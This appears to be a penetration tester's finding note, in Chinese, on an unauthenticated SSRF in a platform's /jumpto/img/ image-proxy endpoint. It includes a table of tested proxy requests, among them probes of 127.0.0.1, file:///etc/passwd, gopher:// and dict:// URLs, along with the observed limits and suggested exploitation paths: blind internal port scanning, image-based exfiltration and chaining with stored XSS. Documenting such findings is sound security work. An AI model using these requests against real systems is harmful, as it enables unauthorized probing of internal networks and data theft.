# CN7 平台未授权开放图片代理 SSRF

## 端点
GET https://<目标>/jumpto/img/<完整URL>      # 无任何 Cookie/Token

## 为什么存在
CN7 平台的配置字段（如 /api/config/system 的 customerLogo、/api/config/getTenantLogo 的 settingValue）
被服务端统一包装成 `/jumpto/img/<远端图片完整URL>` 形式回传，
说明后端有一个「把远端图片抓回来再吐给前端」的代理端点。该端点位于 /api 鉴权拦截器作用范围之外。

## 实测（203.0.113.33）
| 请求 | 结果 |
|---|---|
| /jumpto/img/https://www.baidu.com/img/flexible/logo/pc/result.png | 200 / 6617B / image/png（代理成功） |
| /jumpto/img/https://203.0.113.33/assets/logo/favicon.ico | 200 / 129B / image/png |
| /jumpto/img/https://203.0.113.32:10777/static/picture/1.png | 200 / 5986B / image/png |
| /jumpto/img/http://127.0.0.1:10888/ | 被拒 → SPA 兜底 248590B |
| /jumpto/img/https://203.0.113.33/config.js | 被拒（非图片内容）→ SPA 兜底 |
| /jumpto/img/file:///etc/passwd、gopher://…、dict://… | 被拒 → SPA 兜底 |

## 限制（决定了利用深度）
1. 仅接受 `https://` 前缀（http:// 直接回落 SPA）。
2. 仅回传图片内容（Content-Type 必须是图片，文本响应回落 SPA）→ 不能直接读文本型内网接口。
3. file:// / gopher:// / dict:// 不可用 → 不能打 Redis/MySQL。

## 可用的利用方向
- 盲 SSRF 探测：用「响应耗时 + 是否回图片」区分内网端口开闭。
- 图片型外带：目标内网若有返回图片的接口，可经此代理取回。
- 与存储型 XSS 组合：把代理到的图片 URL 嵌进平台内容。

## 判定脚本
见 attack-files/203.0.113.33/cn7_jumpto_ssrf.py：命中为 200 + 图片魔数；回落 248590B 的 SPA example.com 表示被拒。